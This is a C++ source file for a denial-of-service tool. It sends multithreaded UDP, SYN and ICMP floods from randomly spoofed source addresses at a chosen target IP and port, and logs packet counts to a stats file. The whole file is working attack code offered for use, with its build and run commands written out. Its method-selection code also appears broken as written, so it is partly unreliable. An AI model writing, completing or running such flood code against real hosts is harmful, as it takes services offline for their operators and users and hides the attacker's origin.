// flood.cpp — high-performance flood binary
// build: g++ -O3 -march=native -pthread -o flood flood.cpp
// run:   sudo ./flood <method> <ip> <port> <threads> <stats_file>

#include <arpa/inet.h>
#include <atomic>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <random>
#include <signal.h>
#include <string>
#include <sys/socket.h>
#include <thread>
#include <unistd.h>
#include <vector>

static std::atomic<bool> STOP{false};
static std::atomic<uint64_t> PKTS{0};
static std::atomic<uint64_t> ERRS{0};

static void on_sig(int) { STOP.store(true); }

// ────────────────────────────────────────────
// checksum (RFC 1071)
// ────────────────────────────────────────────
static inline uint16_t csum(const void* data, int len) {
    const uint16_t* buf = (const uint16_t*)data;
    uint32_t sum = 0;
    while (len > 1) { sum += *buf++; len -= 2; }
    if (len) sum += *(const uint8_t*)buf;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

// ────────────────────────────────────────────
// random non-routable-safe source IP
// ────────────────────────────────────────────
static thread_local std::mt19937 rng{std::random_device{}()};
static thread_local std::uniform_int_distribution<uint32_t> u32d{0, 0xFFFFFFFFu};
static thread_local std::uniform_int_distribution<uint16_t> u16d{1024, 65535};

static uint32_t random_ip() {
    while (true) {
        uint32_t ip = u32d(rng);
        uint8_t a = (ip >> 24) & 0xFF;
        uint8_t b = (ip >> 16) & 0xFF;
        if (a == 0 || a == 10 || a == 127) continue;
        if (a == 172 && b >= 16 && b <= 31) continue;
        if (a == 192 && b == 168) continue;
        if (a == 169 && b == 254) continue;
        if (a >= 224) continue;
        return ip;
    }
}

// ────────────────────────────────────────────
// IP + UDP/TCP header builders
// ────────────────────────────────────────────
struct Pkt {
    uint8_t buf[1500];
    size_t len;
};

static void build_ip(uint8_t* buf, uint32_t src, uint32_t dst,
                     uint8_t proto, uint16_t payload_len) {
    struct iphdr* ip = (struct iphdr*)buf;
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(20 + payload_len);
    ip->id = htons((uint16_t)u16d(rng));
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = proto;
    ip->check = 0;
    ip->saddr = src;
    ip->daddr = dst;
    ip->check = csum(ip, 20);
}

// ────────────────────────────────────────────
// attack routines
// ────────────────────────────────────────────
static void flood_udp(const std::string& target_ip, uint16_t port) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { perror("socket"); STOP.store(true); return; }
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt"); close(sock); STOP.store(true); return;
    }

    struct sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
    inet_pton(AF_INET, target_ip.c_str(), &dst.sin_addr);

    uint32_t dst_ip = dst.sin_addr.s_addr;

    // pre-fill payload once
    uint8_t payload[1400];
    for (auto& b : payload) b = (uint8_t)rand();

    uint8_t pkt[1500];
    const size_t payload_len = 1400;
    const size_t udp_len = 8 + payload_len;

    while (!STOP.load(std::memory_order_relaxed)) {
        uint32_t src = random_ip();
        uint16_t sport = u16d(rng);

        build_ip(pkt, src, dst_ip, IPPROTO_UDP, udp_len);

        struct udphdr* udp = (struct udphdr*)(pkt + 20);
        udp->source = htons(sport);
        udp->dest = htons(port);
        udp->len = htons(udp_len);
        udp->check = 0;

        memcpy(pkt + 20 + 8, payload, payload_len);

        ssize_t r = sendto(sock, pkt, 20 + udp_len, 0,
                           (struct sockaddr*)&dst, sizeof(dst));
        if (r < 0) ERRS.fetch_add(1, std::memory_order_relaxed);
        else       PKTS.fetch_add(1, std::memory_order_relaxed);
    }
    close(sock);
}

static void flood_syn(const std::string& target_ip, uint16_t port) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { perror("socket"); STOP.store(true); return; }
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt"); close(sock); STOP.store(true); return;
    }

    struct sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
    inet_pton(AF_INET, target_ip.c_str(), &dst.sin_addr);
    uint32_t dst_ip = dst.sin_addr.s_addr;

    uint8_t pkt[60];
    const size_t tcp_len = sizeof(struct tcphdr);

    while (!STOP.load(std::memory_order_relaxed)) {
        uint32_t src = random_ip();
        uint16_t sport = u16d(rng);

        build_ip(pkt, src, dst_ip, IPPROTO_TCP, tcp_len);

        struct tcphdr* tcp = (struct tcphdr*)(pkt + 20);
        tcp->source = htons(sport);
        tcp->dest = htons(port);
        tcp->seq = (uint32_t)u32d(rng);
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(64240);
        tcp->check = 0;
        tcp->urg_ptr = 0;

        ssize_t r = sendto(sock, pkt, 20 + tcp_len, 0,
                           (struct sockaddr*)&dst, sizeof(dst));
        if (r < 0) ERRS.fetch_add(1, std::memory_order_relaxed);
        else       PKTS.fetch_add(1, std::memory_order_relaxed);
    }
    close(sock);
}

static void flood_icmp(const std::string& target_ip) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) { perror("socket"); STOP.store(true); return; }

    struct sockaddr_in dst{};
    dst.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip.c_str(), &dst.sin_addr);

    uint8_t pkt[1500];
    uint8_t payload[1400];
    for (auto& b : payload) b = (uint8_t)rand();

    const size_t payload_len = 1400;

    while (!STOP.load(std::memory_order_relaxed)) {
        struct icmphdr {
            uint8_t  type;
            uint8_t  code;
            uint16_t checksum;
            uint16_t id;
            uint16_t seq;
        } __attribute__((packed));

        struct icmphdr* icmp = (struct icmphdr*)pkt;
        icmp->type = 8;
        icmp->code = 0;
        icmp->checksum = 0;
        icmp->id = u16d(rng);
        icmp->seq = u16d(rng);
        memcpy(pkt + 8, payload, payload_len);
        icmp->checksum = csum(pkt, 8 + payload_len);

        ssize_t r = sendto(sock, pkt, 8 + payload_len, 0,
                           (struct sockaddr*)&dst, sizeof(dst));
        if (r < 0) ERRS.fetch_add(1, std::memory_order_relaxed);
        else       PKTS.fetch_add(1, std::memory_order_relaxed);
    }
    close(sock);
}

// ────────────────────────────────────────────
// stats writer
// ────────────────────────────────────────────
static void stats_writer(const std::string& path, uint64_t start) {
    while (!STOP.load(std::memory_order_relaxed)) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        std::ofstream f(path, std::ios::trunc);
        if (f) f << PKTS.load() << " " << start << "\n";
    }
}

// ────────────────────────────────────────────
// main
// ────────────────────────────────────────────
int main(int argc, char** argv) {
    if (argc < 6) {
        fprintf(stderr, "usage: %s <method> <ip> <port> <threads> <stats_file>\n", argv[0]);
        fprintf(stderr, "methods: udp syn icmp\n");
        return 1;
    }

    std::string method = argv[1];
    std::string target = argv[2];
    uint16_t port = (uint16_t)atoi(argv[3]);
    int threads = atoi(argv[4]);
    std::string stats_path = argv[5];

    signal(SIGINT, on_sig);
    signal(SIGTERM, on_sig);

    uint64_t start = (uint64_t)time(nullptr);
    std::thread sw(stats_writer, stats_path, start);
    sw.detach();

    auto fn = (method == "udp")  ? [&]{ flood_udp(target, port); }
            : (method == "syn")  ? [&]{ flood_syn(target, port); }
            : (method == "icmp") ? [&]{ flood_icmp(target); }
            : nullptr;

    if (!fn) {
        fprintf(stderr, "[!] unsupported method: %s\n", method.c_str());
        return 2;
    }

    std::vector<std::thread> pool;
    for (int i = 0; i < threads; i++) pool.emplace_back(fn);
    for (auto& t : pool) t.join();

    // final stats
    std::ofstream f(stats_path, std::ios::trunc);
    if (f) f << PKTS.load() << " " << start << "\n";

    fprintf(stderr, "[+] sent %lu pkts, %lu errs\n",
            (unsigned long)PKTS.load(), (unsigned long)ERRS.load());
    return 0;
}
